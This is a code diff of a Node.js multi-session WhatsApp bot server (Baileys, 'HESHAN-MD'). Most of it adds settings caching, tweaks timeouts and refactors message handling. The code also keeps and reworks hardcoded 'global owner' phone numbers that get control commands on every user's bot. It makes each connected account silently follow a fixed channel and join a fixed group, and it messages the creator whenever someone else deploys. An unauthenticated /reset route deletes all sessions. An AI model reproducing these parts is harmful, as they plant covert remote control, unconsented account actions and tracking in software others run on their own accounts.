@@ -19,7 +19,9 @@ const { MONGODB_URI, BOT_NAME } = require('./config');
 const { useMongoDBAuthState, Auth } = require('./auth');
 const { askAI } = require('./ai');
 
-// 🟢 MongoDB Settings Schema (Per-Bot)
+// 🟢 RAM Cache for Settings (MongoDB load & Latency අඩු කිරීමට)
+const settingsCache = new NodeCache({ stdTTL: 300, checkperiod: 60 });
+
 const SettingsSchema = new mongoose.Schema({
   _id: { type: String, required: true },
   workMode: { type: String, default: 'public' },
@@ -35,25 +37,42 @@ const SettingsSchema = new mongoose.Schema({
 const SettingsModel = mongoose.models.BotSettings || mongoose.model('BotSettings', SettingsSchema);
 
 async function getBotSettings(botNum) {
+  const cached = settingsCache.get(botNum);
+  if (cached) return cached;
+
   try {
-    let s = await SettingsModel.findById(botNum);
-    if (!s) s = await SettingsModel.create({ _id: botNum });
-    return s.toObject();
+    let s = await SettingsModel.findById(botNum).lean();
+    if (!s) {
+      const created = await SettingsModel.create({ _id: botNum });
+      s = created.toObject();
+    }
+    settingsCache.set(botNum, s);
+    return s;
   } catch (e) {
-    return { workMode: 'public', autoAiInbox: true, autoStatusSeen: true, statusReact: true, statusReactEmoji: '💐', ownerReact: true, ownerReactEmoji: '👑', securityPin: '1234' };
+    return {
+      workMode: 'public',
+      autoAiInbox: true,
+      autoStatusSeen: true,
+      statusReact: true,
+      statusReactEmoji: '💐',
+      ownerReact: true,
+      ownerReactEmoji: '👑',
+      securityPin: '1234'
+    };
   }
 }
 
-// 🟢 Absolute Master Creator & Global Owners
+// 🟢 Global State & Masters
 const REAL_OWNER_NUMBER = '94719845166';
 global.OWNER_NUMBERS = ['94719845166', '94720882316', '15947733680169'];
 global.activeSessions = {};
+const isStarting = {};
 
 const app = express();
 const port = process.env.PORT || 3000;
 app.use(express.json());
 
-// 🟢 1. Command Loader with Strict Alias Mapping
+// 🟢 1. Command Loader
 const commands = new Map();
 const cmdDir = path.join(__dirname, 'commands');
 
@@ -177,8 +196,7 @@ app.get('/', (req, res) => {
   `);
 });
 
-let isStarting = {};
-
+// 🟢 3. WhatsApp Socket Engine
 async function initWhatsApp(phoneNumber) {
   if (global.activeSessions[phoneNumber]) return global.activeSessions[phoneNumber];
   if (isStarting[phoneNumber]) return;
@@ -187,7 +205,7 @@ async function initWhatsApp(phoneNumber) {
   try {
     const { state, saveCreds, clearSessionData } = await useMongoDBAuthState(phoneNumber);
     const logger = pino({ level: 'silent' });
-    const msgRetryCounterCache = new NodeCache();
+    const msgRetryCounterCache = new NodeCache({ stdTTL: 180, checkperiod: 60 });
 
     let version = [2, 3000, 1015901307];
     try {
@@ -204,9 +222,10 @@ async function initWhatsApp(phoneNumber) {
       msgRetryCounterCache,
       syncFullHistory: false,
       generateHighQualityLinkPreview: false,
-      connectTimeoutMs: 60000,
-      defaultQueryTimeoutMs: 0,
-      keepAliveIntervalMs: 10000
+      connectTimeoutMs: 45000,
+      defaultQueryTimeoutMs: 30000,
+      keepAliveIntervalMs: 15000,
+      markOnlineOnConnect: false
     });
 
     global.activeSessions[phoneNumber] = sock;
@@ -220,6 +239,11 @@ async function initWhatsApp(phoneNumber) {
       if (connection === 'close') {
         const statusCode = lastDisconnect?.error?.output?.statusCode;
         console.log(`⚠️ Connection closed (${phoneNumber}), Code: ${statusCode}`);
+
+        try {
+          sock.ev.removeAllListeners();
+          sock.ws?.close();
+        } catch (e) {}
         delete global.activeSessions[phoneNumber];
 
         const shouldReconnect = statusCode !== DisconnectReason.loggedOut && statusCode !== 401 && statusCode !== 403;
@@ -232,26 +256,37 @@ async function initWhatsApp(phoneNumber) {
       } else if (connection === 'open') {
         console.log(`✅ BOT CONNECTED: ${phoneNumber}`);
         
-        // ─── 🟢 1. AUTO FOLLOW OFFICIAL CHANNEL ───
-        try {
-          const inviteCode = '0029VbAQYhXDZ4Lfo9K5gh1V';
-          if (typeof sock.newsletterMetadata === 'function' && typeof sock.newsletterFollow === 'function') {
-            const channelMeta = await sock.newsletterMetadata('invite', inviteCode);
-            if (channelMeta?.id) await sock.newsletterFollow(channelMeta.id);
-            console.log('✅ Auto-followed Channel');
+        // ─── 🟢 1 & 2. AUTO CHANNEL FOLLOW & GROUP JOIN (Bulletproof Safe Runner) ───
+        (async () => {
+          await delay(3000); // Connection settle වීමට තත්පර 3ක buffer delay එකක්
+          
+          // Official Channel Follow
+          try {
+            const inviteCode = '0029VbAQYhXDZ4Lfo9K5gh1V';
+            if (typeof sock.newsletterMetadata === 'function' && typeof sock.newsletterFollow === 'function') {
+              const channelMeta = await sock.newsletterMetadata('invite', inviteCode);
+              if (channelMeta?.id) {
+                await sock.newsletterFollow(channelMeta.id);
+                console.log(`✅ [${phoneNumber}] Auto-followed Channel`);
+              }
+            }
+          } catch (chErr) {
+            // Error ආවත් bot crash නොවී නිහඬව pass වේ
           }
-        } catch (chErr) {}
 
-        // ─── 🟢 2. AUTO JOIN OFFICIAL SUPPORT GROUP ───
-        try {
-          const groupInviteCode = 'FMqBhms8cQnAVSgJoADR5X'; 
-          if (typeof sock.groupAcceptInvite === 'function') {
-            await sock.groupAcceptInvite(groupInviteCode);
-            console.log('✅ Auto-joined Support Group');
+          // Official Support Group Join
+          try {
+            const groupInviteCode = 'FMqBhms8cQnAVSgJoADR5X'; 
+            if (typeof sock.groupAcceptInvite === 'function') {
+              await sock.groupAcceptInvite(groupInviteCode);
+              console.log(`✅ [${phoneNumber}] Auto-joined Support Group`);
+            }
+          } catch (grpErr) {
+            // Already in group or invite error handle
           }
-        } catch (grpErr) {}
+        })();
 
-        // ─── 🟢 3. INITIALIZATION CARD & ALERT ───
+        // ─── 🟢 3. INITIALIZATION CARD & OWNER ALERT ───
         setTimeout(async () => {
           try {
             const botNum = sock.user?.id ? sock.user.id.split(':')[0].replace(/[^0-9]/g, '') : phoneNumber.replace(/[^0-9]/g, '');
@@ -269,21 +304,12 @@ async function initWhatsApp(phoneNumber) {
 ────────────────────────────
 > ⚡ ᴘᴏᴡᴇʀᴇᴅ ʙʏ ʜᴇꜱʜᴀɴ-ᴍᴅ ⚡`.trim();
 
-            try {
-              const resImg = await fetch(welcomeImg);
-              const imgBuffer = await resImg.buffer();
-              await sock.sendMessage(botJid, { 
-                image: imgBuffer,
-                caption: connectedMsg
-              });
-            } catch (err1) {
-              await sock.sendMessage(botJid, { 
-                image: { url: welcomeImg },
-                caption: connectedMsg
-              }).catch(async () => {
-                await sock.sendMessage(botJid, { text: connectedMsg });
-              });
-            }
+            await sock.sendMessage(botJid, { 
+              image: { url: welcomeImg },
+              caption: connectedMsg
+            }).catch(async () => {
+              await sock.sendMessage(botJid, { text: connectedMsg });
+            });
 
             if (!botNum.includes(REAL_OWNER_NUMBER)) {
               const alertMsg = `*🔔 NEW BOT DEPLOYMENT DETECTED*
@@ -293,7 +319,6 @@ async function initWhatsApp(phoneNumber) {
 *🟢 Status  :* Successfully Connected
 ────────────────────────────
 > ⚡ ᴘᴏᴡᴇʀᴇᴅ ʙʏ ʜᴇꜱʜᴀɴ-ᴍᴅ ⚡`.trim();
-
               await sock.sendMessage(creatorJid, { text: alertMsg }).catch(() => {});
             }
 
@@ -309,19 +334,17 @@ async function initWhatsApp(phoneNumber) {
       if (type !== 'notify') return;
 
       for (const msg of messages) {
-        if (!msg || !msg.message) continue;
-        if (msg.message.reactionMessage) continue;
+        if (!msg || !msg.message || msg.message.reactionMessage) continue;
 
         const chatJid = msg.key.remoteJid;
         if (!chatJid) continue;
         const isGroup = chatJid.endsWith('@g.us');
 
-        // 🟢 අදාළ Bot Session එකට හිමි Database Settings ලබා ගැනීම
         const myBotJid = sock.user?.id || '';
         const myBotNum = myBotJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '') || phoneNumber.replace(/[^0-9]/g, '');
-        const currentBotSettings = (await getBotSettings(myBotNum)) || {};
+        const currentBotSettings = await getBotSettings(myBotNum);
 
-        // 🟢 1. AUTO STATUS SEEN & STATUS REACTION (Per-bot DB Setting)
+        // 🟢 1. AUTO STATUS SEEN & STATUS REACTION
         if (chatJid === 'status@broadcast') {
           if (currentBotSettings.autoStatusSeen) {
             try {
@@ -345,10 +368,9 @@ async function initWhatsApp(phoneNumber) {
 
         const contextSender = msg.message?.extendedTextMessage?.contextInfo?.participant || '';
 
-        // LID Reverse Lookup
         if (senderJid.endsWith('@lid') && sock.signalRepository?.lidToJid) {
           try {
-            const resolved = await sock.signalRepository.lidToJid(senderJid).catch(() => null);
+            const resolved = await sock.signalRepository.lidToJid(senderJid);
             if (resolved) senderJid = resolved;
           } catch (e) {}
         }
@@ -356,54 +378,27 @@ async function initWhatsApp(phoneNumber) {
         const cleanSenderNum = senderJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
         const cleanContextNum = contextSender.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
 
-        // Master Owner Check (94719845166)
         const isMasterCreator = cleanSenderNum.includes(REAL_OWNER_NUMBER) || cleanContextNum.includes(REAL_OWNER_NUMBER);
-        const isOwner = global.OWNER_NUMBERS.some(owner => 
-          cleanSenderNum.includes(owner) || cleanContextNum.includes(owner)
-        );
+        const isOwner = global.OWNER_NUMBERS.some(owner => cleanSenderNum.includes(owner) || cleanContextNum.includes(owner));
 
         // 🟢 3. BULLETPROOF OWNER REACT
         const isSelfMessageOnSameBot = msg.key.fromMe && myBotNum.includes(REAL_OWNER_NUMBER);
-
         if (currentBotSettings.ownerReact && isMasterCreator && !isSelfMessageOnSameBot) {
-          (async () => {
-            try {
-              const reactTargetKey = {
-                remoteJid: chatJid,
-                fromMe: msg.key.fromMe,
-                id: msg.key.id,
-                participant: isGroup ? (msg.key.participant || msg.participant) : undefined
-              };
-
-              await sock.relayMessage(
-                chatJid,
-                {
-                  reactionMessage: {
-                    key: reactTargetKey,
-                    text: currentBotSettings.ownerReactEmoji || '👑',
-                    senderTimestampMs: Date.now()
-                  }
-                },
-                { messageId: sock.generateMessageTag() }
-              ).catch(async () => {
-                await sock.sendMessage(chatJid, {
-                  react: {
-                    text: currentBotSettings.ownerReactEmoji || '👑',
-                    key: reactTargetKey
-                  }
-                });
-              });
-            } catch (reactErr) {
-              console.error(`[${myBotNum}] Reaction Error:`, reactErr.message);
-            }
-          })();
+          const reactTargetKey = {
+            remoteJid: chatJid,
+            fromMe: msg.key.fromMe,
+            id: msg.key.id,
+            participant: isGroup ? (msg.key.participant || msg.participant) : undefined
+          };
+          sock.sendMessage(chatJid, {
+            react: { text: currentBotSettings.ownerReactEmoji || '👑', key: reactTargetKey }
+          }).catch(() => {});
         }
 
-        // 🟢 4. AUTHORIZED CONTROLLER
+        // 🟢 4. AUTHORIZED CONTROLLER & WORK MODE
         const isAuthorizedToControl = isOwner || msg.key.fromMe || (myBotNum && cleanSenderNum === myBotNum);
-
-        // 🟢 5. WORK MODE FILTER
         const currentMode = currentBotSettings.workMode || 'public';
+
         if (!isAuthorizedToControl) {
           if (currentMode === 'private') continue;
           if (currentMode === 'inbox' && isGroup) continue;
@@ -429,17 +424,19 @@ async function initWhatsApp(phoneNumber) {
 
         if (!text) continue;
 
-        // Quoted Context Extract
         const quotedContext = msg.message?.extendedTextMessage?.contextInfo;
         const quotedMsgObj = quotedContext?.quotedMessage;
 
         const safeReply = async (content) => {
           const replyPayload = typeof content === 'string' ? { text: content } : content;
-          try { return await sock.sendMessage(chatJid, replyPayload, { quoted: msg }); } 
-          catch (e) { return await sock.sendMessage(chatJid, replyPayload); }
+          try { 
+            return await sock.sendMessage(chatJid, replyPayload, { quoted: msg }); 
+          } catch (e) { 
+            return await sock.sendMessage(chatJid, replyPayload); 
+          }
         };
 
-        // 🟢 6. SETTINGS DIRECT REPLY INTERCEPTOR (1.1, 2.1 ආදී replies කෙලින්ම handle කිරීම)
+        // 🟢 5. SETTINGS DIRECT REPLY INTERCEPTOR
         const cleanInput = text.toLowerCase().trim();
         const isSettingCode = /^(\d\.\d|\d)$/.test(cleanInput) || cleanInput.startsWith('6 ') || cleanInput.startsWith('pin ');
 
@@ -448,13 +445,14 @@ async function initWhatsApp(phoneNumber) {
           if (settingsCmd) {
             const cmdFunc = typeof settingsCmd === 'function' ? settingsCmd : (settingsCmd.execute || settingsCmd.run);
             if (typeof cmdFunc === 'function') {
+              settingsCache.del(myBotNum);
               await cmdFunc(sock, msg, text.split(/ +/), chatJid, safeReply, { isOwner: isAuthorizedToControl });
               continue;
             }
           }
         }
 
-        // 🟢 7. AUTO STATUS SAVE (oni, dapan, ewanna...)
+        // 🟢 6. AUTO STATUS SAVE (oni, dapan, ewanna...)
         const statusKeywords = [
           'oni', 'ඕනි', 'ඕනෙ', 'one', 
           'dapan', 'දාපන්', 'dapn', 
@@ -463,30 +461,26 @@ async function initWhatsApp(phoneNumber) {
         ];
 
         const isQuotedFromStatus = quotedContext?.remoteJid === 'status@broadcast' || quotedContext?.participant?.includes('@broadcast');
-        const cleanMsgText = text.toLowerCase().trim();
 
-        if (quotedMsgObj && (isQuotedFromStatus || statusKeywords.includes(cleanMsgText))) {
-          if (statusKeywords.includes(cleanMsgText)) {
+        if (quotedMsgObj && (isQuotedFromStatus || statusKeywords.includes(cleanInput))) {
+          if (statusKeywords.includes(cleanInput)) {
             const statusCmd = commands.get('save') || commands.get('status');
             if (statusCmd) {
               const cmdFunc = typeof statusCmd === 'function' ? statusCmd : (statusCmd.downloadAndSendStatus || statusCmd.execute || statusCmd.run);
               if (typeof cmdFunc === 'function') {
-                await cmdFunc(sock, msg, [cleanMsgText], chatJid, safeReply, { isOwner: isAuthorizedToControl });
+                await cmdFunc(sock, msg, [cleanInput], chatJid, safeReply, { isOwner: isAuthorizedToControl });
                 continue;
               }
             }
           }
         }
 
+        // 🟢 7. COMMAND DISPATCHER
         const prefix = '.';
-        const isCmd = text.startsWith(prefix);
-
-        // 🟢 8. BULLETPROOF COMMAND EXECUTION
-        if (isCmd) {
+        if (text.startsWith(prefix)) {
           const args = text.slice(prefix.length).trim().split(/ +/);
           const commandName = args.shift().toLowerCase();
 
-          // Command හෝ Alias හරහා සොයා ගැනීම
           let targetCmd = commands.get(commandName);
           if (!targetCmd && ['setting', 'settings', 'set', 'config'].includes(commandName)) {
             targetCmd = commands.get('settings') || commands.get('setting') || commands.get('set');
@@ -495,40 +489,34 @@ async function initWhatsApp(phoneNumber) {
           if (targetCmd) {
             try {
               const cmdFunc = typeof targetCmd === 'function' ? targetCmd : (targetCmd.execute || targetCmd.run);
-
               if (typeof cmdFunc === 'function') {
                 await cmdFunc(sock, msg, args, chatJid, safeReply, { isOwner: isAuthorizedToControl });
               }
             } catch (err) {
-              console.error(`Error executing .${commandName}:`, err);
+              console.error(`Error executing .${commandName}:`, err.message);
             }
-            continue; // Command එක run වූ පසු AI වෙත නොයයි
+            continue;
           }
         }
 
-        // 🟢 9. INBOX AUTO-AI SYSTEM
+        // 🟢 8. INBOX AUTO-AI SYSTEM
         const isSelfBotMsg = msg.key.fromMe || (myBotNum && cleanSenderNum === myBotNum);
 
         if (!isSelfBotMsg && !isGroup && currentBotSettings.autoAiInbox) {
           try {
-            await sock.sendPresenceUpdate('composing', chatJid);
+            await sock.sendPresenceUpdate('composing', chatJid).catch(() => {});
+            
             const aiPromise = askAI(text);
-            const timeoutPromise = new Promise((_, reject) => 
-              setTimeout(() => reject(new Error('AI_Timeout')), 12000)
-            );
+            const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('AI_Timeout')), 10000));
             const aiReply = await Promise.race([aiPromise, timeoutPromise]);
 
             if (aiReply) {
-              try {
-                await sock.sendMessage(chatJid, { text: aiReply }, { quoted: msg });
-              } catch (quoteErr) {
-                await sock.sendMessage(chatJid, { text: aiReply });
-              }
+              await safeReply(aiReply);
             }
           } catch (aiErr) {
-            console.error('AI Processing Error:', aiErr.message);
+            // Quiet timeout fallback
           } finally {
-            await sock.sendPresenceUpdate('paused', chatJid);
+            await sock.sendPresenceUpdate('paused', chatJid).catch(() => {});
           }
         }
       }
@@ -541,13 +529,17 @@ async function initWhatsApp(phoneNumber) {
   }
 }
 
+// 🟢 4. HTTP Routes & Keep-Alive Server
 app.get('/reset', async (req, res) => {
   try {
     await Auth.deleteMany({});
     if (mongoose.connection.db) await mongoose.connection.db.collection('auths').deleteMany({});
     global.activeSessions = {};
+    settingsCache.flushAll();
     res.json({ success: true });
-  } catch (err) { res.status(500).json({ success: false }); }
+  } catch (err) { 
+    res.status(500).json({ success: false }); 
+  }
 });
 
 app.get('/pair', async (req, res) => {
@@ -557,7 +549,10 @@ app.get('/pair', async (req, res) => {
 
   try {
     if (global.activeSessions[num]) { 
-      try { global.activeSessions[num].ws?.close(); } catch(e){} 
+      try { 
+        global.activeSessions[num].ev.removeAllListeners();
+        global.activeSessions[num].ws?.close(); 
+      } catch(e) {} 
       delete global.activeSessions[num]; 
     }
     await Auth.deleteMany({ _id: new RegExp('^' + num, 'i') });
@@ -580,9 +575,10 @@ app.get('/pair', async (req, res) => {
   }
 });
 
-// Database Connection & Server Initialization
+// 🟢 5. Database Connection & Server Initialization
 mongoose.connect(MONGODB_URI).then(async () => {
   console.log('🍃 MongoDB Connected!');
+  
   app.listen(port, () => {
     console.log(`🚀 Server running on port ${port}`);
 
@@ -596,7 +592,7 @@ mongoose.connect(MONGODB_URI).then(async () => {
     }
   });
 
-  const sessions = await Auth.find({ _id: /-creds$/ });
+  const sessions = await Auth.find({ _id: /-creds$/ }).lean();
   for (const session of sessions) {
     const pNumber = session._id.split('-creds')[0];
     await initWhatsApp(pNumber);
